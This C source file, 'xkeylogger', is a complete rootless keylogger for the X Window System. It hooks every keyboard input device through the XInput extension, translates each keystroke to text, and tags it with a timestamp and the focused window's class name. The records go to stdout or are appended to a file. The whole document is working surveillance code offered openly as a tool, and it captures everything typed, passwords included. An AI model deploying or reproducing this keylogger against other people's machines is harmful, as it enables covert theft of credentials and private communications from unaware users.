/*

xkeylogger - Rootless keylogger for X

Copyright (c) 2018 Andrea Cardaci <cyrus.and@gmail.com>
Copyright (c) 2019 Robin Heinemann <robin.ole.heinemann@gmail.com>

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
the Software, and to permit persons to whom the Software is furnished to do so,
subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

*/

#include <X11/XKBlib.h>
#include <X11/Xlib.h>
#include <X11/extensions/XInput.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define XK_MISCELLANY
#include <X11/keysymdef.h>

static char * NO_TITLE         = "(no title)";
static char * NO_ACTIVE_WINDOW = "(no active window)";
static FILE * output;
static int    KEY_PRESS_TYPE   = -1;
static int    KEY_RELEASE_TYPE = -1;

struct keystroke_info {
    struct timespec timestamp;
    unsigned int    original_keycode;
    KeySym          original_keysym;
    int             type;
    unsigned int    modifier_mask;
    int             translation_available;
    KeySym          translated_keysym;
    char            translated_char[64];
    Window *        focused_window;
    char *          focused_window_name;
};

static void process_event(const struct keystroke_info * info) {
    char * type = "invalid";

    if (info->type == KEY_PRESS_TYPE) {
        type = "press";
    } else if (info->type == KEY_RELEASE_TYPE) {
        type = "release";
    }

    fprintf(output, "%s:%ld.%ld:%s:", info->focused_window_name, info->timestamp.tv_sec,
            info->timestamp.tv_nsec, type);

    switch(info->original_keysym) {
    /* avoid ambiguity of newline */
    case XK_Return:
    case XK_KP_Enter:
        fprintf(output, "<!{Return}!>");
        break;
    default:
        /* use default translation skipping control characters that are not
           associated to graphocal glyphs */
        if(info->translation_available &&
           !(info->modifier_mask & ControlMask) &&
           !(info->modifier_mask & Mod1Mask) &&
           !(info->modifier_mask & Mod4Mask) &&
           info->original_keysym != XK_Escape) {
            fprintf(output, "%s", info->translated_char);
        } /* use the "internal" x name */
        else {
            fprintf(output, "<!{%s}!>", XKeysymToString(info->translated_keysym));
        };
    }

    fprintf(output, "\n");

    fflush(output);
}

static void register_events(Display * display, Window root) {
    int           i, n;
    XDeviceInfo * devices;

    /* get all input devices */
    devices = XListInputDevices(display, &n);

    for(i = 0; i < n; i++) {
        /* register events for each slave keyboard device since it's hard to
           know the device id of the real one */
        if(devices[i].use == IsXExtensionKeyboard) {
            XDevice *   device;
            XEventClass event_class[2];

            /* open device and register the event */
            device = XOpenDevice(display, devices[i].id);
            DeviceKeyPress(device, KEY_PRESS_TYPE, event_class[0]);
            DeviceKeyRelease(device, KEY_RELEASE_TYPE, event_class[1]);
            XSelectExtensionEvent(display, root, event_class, 2);
        }
    }

    XFreeDeviceList(devices);
}

static XIC get_input_context(Display * display) {
    int         i;
    XIM         xim;
    XIMStyles * xim_styles;
    XIMStyle    xim_style;
    XIC         xic;

    /* open input method */
    assert((xim = XOpenIM(display, NULL, NULL, NULL)));

    /* fetch styles  */
    assert((!XGetIMValues(xim, XNQueryInputStyle, &xim_styles, NULL)));
    assert((xim_styles != NULL));

    /* search wanted style */
    for(xim_style = 0, i = 0; i < xim_styles->count_styles; i++) {
        if(xim_styles->supported_styles[i] ==
           (XIMPreeditNothing | XIMStatusNothing)) {
            xim_style = xim_styles->supported_styles[i];
            break;
        }
    }
    assert((xim_style != 0));

    /* create input context */
    assert((xic = XCreateIC(xim, XNInputStyle, xim_style, NULL)));

    XFree(xim_styles);
    return xic;
}

static int translate_device_key_event(XIC xic, XDeviceKeyEvent * event,
                                      KeySym * out_keysym, char * out_string) {
    XKeyEvent key_event;
    Status    status;
    int       length;

    /* build associated key event */
    key_event.type        = KeyPress;
    key_event.serial      = event->serial;
    key_event.send_event  = event->send_event;
    key_event.display     = event->display;
    key_event.window      = event->window;
    key_event.root        = event->root;
    key_event.subwindow   = event->subwindow;
    key_event.time        = event->time;
    key_event.state       = event->state;
    key_event.keycode     = event->keycode;
    key_event.same_screen = event->same_screen;

    /* translate the keystroke */
    /* utf8 here is important, probably locale dependent? */
    length =
        Xutf8LookupString(xic, &key_event, out_string, 64, out_keysym, &status);
    if(status == XLookupBoth) {
        out_string[length] = '\0';
        return 1;
    }

    return 0;
}

static int get_window_property(Display * display, Window window,
                               const char * name, const char * type,
                               void * data) {
    Atom          name_atom;
    Atom          type_atom;
    Atom          actual_type;
    int           format, status;
    unsigned long n_items, after;

    /* get atoms */
    name_atom = XInternAtom(display, name, True);
    type_atom = XInternAtom(display, type, True);

    /* get window property */
    status = XGetWindowProperty(display, window, name_atom, False, 0xffff,
                                False, type_atom, &actual_type, &format,
                                &n_items, &after, (unsigned char **)data);

    return status == Success;
}

static int get_window_name(Display * display, Window window, char ** name) {
    if(window) {
        int ret;

        /* XA_STRING instead of UTF8_STRING because random */
        ret =
            get_window_property(display, window, "WM_CLASS", "XA_STRING", name);

        if(ret && !*name) *name = NO_TITLE;
        return ret;
    }
    /* e.g. no windows on the root */
    else {
        *name = NO_ACTIVE_WINDOW;
        return 1;
    }
}

static int get_current_window(Display * display, Window ** window) {
    Window root;

    root = DefaultRootWindow(display);
    return get_window_property(display, root, "_NET_ACTIVE_WINDOW", "WINDOW",
                               window);
}

int main(int argc, char * argv[]) {
    Display * display;
    int       screen;
    Window    root;
    XIC       xic;

    if (argc == 2) {
        output = fopen(argv[1], "a");
    } else {
        output = stdout;
    }

    /* open display */
    if(display = XOpenDisplay(NULL), !display) {
        fprintf(stderr, "Cannot open display\n");
        return EXIT_FAILURE;
    }

    /* get variables */
    screen = DefaultScreen(display);
    root   = RootWindow(display, screen);

    /* get input context */
    xic = get_input_context(display);

    /* register events for every keyboard */
    register_events(display, root);

    /* event loop */
    while(1) {
        XEvent                event;
        XDeviceKeyEvent *     device_event;
        struct keystroke_info info;

        /* wait for the next event */
        XNextEvent(display, &event);

        /* fill keystroke info */
        device_event = (XDeviceKeyEvent *)&event;
        clock_gettime(CLOCK_REALTIME, &info.timestamp); // = time( NULL );
        info.type = device_event->type;
        info.original_keycode = device_event->keycode;
        info.original_keysym =
            XkbKeycodeToKeysym(display, device_event->keycode, 0, 0);
        info.modifier_mask = device_event->state;
        get_current_window(display, &info.focused_window);
        get_window_name(display, *info.focused_window,
                        &info.focused_window_name);

        /* translate keystroke */
        info.translation_available = translate_device_key_event(
            xic, device_event, &info.translated_keysym, info.translated_char);

        /* process the event */
        process_event(&info);

        /* cleanup */
        XFree(info.focused_window);
        if(info.focused_window_name != NO_TITLE &&
           info.focused_window_name != NO_ACTIVE_WINDOW) {
            XFree(info.focused_window_name);
        }
    }
}
